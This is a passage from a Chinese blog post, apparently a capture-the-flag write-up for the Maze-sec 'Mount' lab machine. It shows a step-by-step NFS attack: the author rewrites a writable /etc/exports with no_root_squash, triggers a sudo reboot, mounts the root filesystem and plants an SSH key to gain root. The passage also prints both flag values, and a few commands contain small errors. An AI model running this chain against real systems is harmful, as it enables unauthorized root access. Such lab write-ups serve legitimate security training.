+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# ssh-keygen            <br>Generating public/private ed25519 key pair.<br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> to save the key (/root/.ssh/id_ed25519): <br>/root/.ssh/id_ed25519 already exists.<br>Overwrite (y/n)? <br></code></pre></td></tr></table></figure>
+</li>
+<li><p>将公钥<code>id_ed25519.pub</code>移动到用户<code>nfsuser</code>目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# <span class="hljs-built_in">cp</span> ~/.ssh/id_ed25519.pub /home/nfsuser<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>将公钥写入到挂载的文件<code>mnt</code>里面，并赋予执行权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nfsuser@kali:/root/miaosec/maze-sec/mount/mnt$ <span class="hljs-built_in">cat</span> /home/nfsuser &gt; .ssh/<br>nfsuser@kali:/root/miaosec/maze-sec/mount/mnt$ <span class="hljs-built_in">chmod</span> +x .ssh/authorized_keys <br></code></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="三、获取ll104567权限"><a href="#三、获取ll104567权限" class="headerlink" title="三、获取ll104567权限"></a>三、获取ll104567权限</h1><p>直接执行即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# ssh ll104567@192.168.2.8<br>Linux Mount 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Wed Aug 20 23:46:24 2025 from 192.168.3.94<br>ll104567@Mount:~$ <span class="hljs-built_in">id</span><br>uid=6666(ll104567) gid=6666(ll104567) <span class="hljs-built_in">groups</span>=6666(ll104567)<br></code></pre></td></tr></table></figure>
+
+<h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><p>查看<code>sudo</code>属性</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ll104567@Mount:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> ll104567 on Mount:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User ll104567 may run the following commands on Mount:<br>    (ALL) NOPASSWD: /sbin/reboot<br></code></pre></td></tr></table></figure>
+<p>发现<code>/sbin/reboot</code>具有<code>root</code>权限</p>
+<h2 id="1、NFS配置文件"><a href="#1、NFS配置文件" class="headerlink" title="1、NFS配置文件"></a>1、NFS配置文件</h2><p>查看配置文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">ll104567@Mount:~$ <span class="hljs-built_in">cat</span> /etc/exports <br><span class="hljs-comment"># /etc/exports: the access control list for filesystems which may be exported</span><br><span class="hljs-comment">#               to NFS clients.  See exports(5).</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example for NFSv2 and NFSv3:</span><br><span class="hljs-comment"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example for NFSv4:</span><br><span class="hljs-comment"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span><br><span class="hljs-comment"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span><br><span class="hljs-comment">#</span><br>/home/ll104567 *(rw,<span class="hljs-built_in">sync</span>,root_squash,no_subtree_check)<br></code></pre></td></tr></table></figure>
+<p>发现里面是配置了具体可以挂载的文件，同时配置了<code>root_squash</code>，限制了root权限</p>
+<p>查看文件的属性，发现用户<code>ll104567</code>具有写权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ll104567@Mount:~$ <span class="hljs-built_in">ls</span> -la /etc/exports <br>-rw-rw---- 1 root ll104567 444 Aug 21 00:00 /etc/export<br></code></pre></td></tr></table></figure>
+
+<h2 id="2、NFS配置劫持"><a href="#2、NFS配置劫持" class="headerlink" title="2、NFS配置劫持"></a>2、NFS配置劫持</h2><p>修改配置文件，添加不受<code>root_squash</code>影响的路径，直接挂载根目录<code>/</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ll104567@Mount:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/ *(rw,sync,no_root_squash,no_subtree_check)&quot;</span> &gt;&gt; /etc/exports <br></code></pre></td></tr></table></figure>
+
+<p>重启系统使配置生效</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ll104567@Mount:~$ <span class="hljs-built_in">sudo</span> /sbin/reboot<br></code></pre></td></tr></table></figure>
+
+<p>再次查看挂载的路径，发现根目录可挂载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# showmount -e 192.168.2.8<br>Export list <span class="hljs-keyword">for</span> 192.168.2.8:<br>/              *<br>/home/ll104567 *<br></code></pre></td></tr></table></figure>
+
+<p>将根目录挂载到当前目录下的<code>m_root</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# mount -t nfs 192.168.2.8:/ ./m_root -o nolock<br></code></pre></td></tr></table></figure>
+
+<h2 id="3、写入ROOT-SSH公钥"><a href="#3、写入ROOT-SSH公钥" class="headerlink" title="3、写入ROOT-SSH公钥"></a>3、写入ROOT-SSH公钥</h2><p>将ssh公钥复制到<code>/root/.ssh</code>目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/…/mount/m_root/root/.ssh]<br>└─# <span class="hljs-built_in">cp</span> /home/nfsuser authorized_keys  <br>┌──(root㉿kali)-[~/…/maze-sec/mount/m_root/root]<br>└─# <span class="hljs-built_in">chmod</span> +x .ssh/authorized_keys<br></code></pre></td></tr></table></figure>
+
+<h2 id="4、获取ROOT权限"><a href="#4、获取ROOT权限" class="headerlink" title="4、获取ROOT权限"></a>4、获取ROOT权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/…/maze-sec/mount/m_root/root]<br>└─# ssh root@192.168.2.8    <br>Linux Mount 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Wed Aug 20 23:45:38 2025 from 192.168.3.94<br>root@Mount:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>
+
+<h1 id="五、获取FLAG"><a href="#五、获取FLAG" class="headerlink" title="五、获取FLAG"></a>五、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Mount:~# <span class="hljs-built_in">cat</span> /home/guest/user.txt /root/root.txt <br>flag&#123;user-60b725f10c9c85c70d97880dfe8191b3&#125;<br>flag&#123;root-a8a78d0ff555c931f045b6f448129846&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Maze-sec/" class="category-chain-item">Maze-sec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/NFS%E6%9C%8D%E5%8A%A1/" class="print-no-link">#NFS服务</a>
+      
+        <a href="/tags/sudo-reboot/" class="print-no-link">#sudo-reboot</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Mount</div>
+      <div>http://miao-sec.github.io/Maze-sec/Mount/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年1月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/Maze-sec/Next/" title="Next">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Next</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Maze-sec/Maze/" title="Maze">
+                        <span class="hidden-mobile">Maze</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
